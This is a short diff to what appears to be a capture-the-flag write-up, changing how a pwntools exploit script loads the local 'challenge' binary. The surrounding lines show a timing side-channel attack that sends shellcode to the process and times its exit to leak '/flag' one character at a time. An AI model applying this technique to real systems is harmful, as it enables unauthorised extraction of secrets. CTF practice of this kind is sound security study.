@@ -79,8 +79,7 @@ By measuring the time the process takes to terminate, we can determine the value
 from pwn import *
 import time
 
-exe = "./challenge"
-context.binary = exe
+elf = context.binary = ELF("./challenge")
 
 flag = ""
 index = 0
@@ -120,7 +119,7 @@ while True:
         start_time = time.time()
 
         # Run process quietly
-        p = process([exe, "/flag"], level='error')
+        p = process([elf.path, "/flag"], level='error')
         p.send(shellcode)
 
         # Wait for it to finish (or kill it if it sleeps too long)
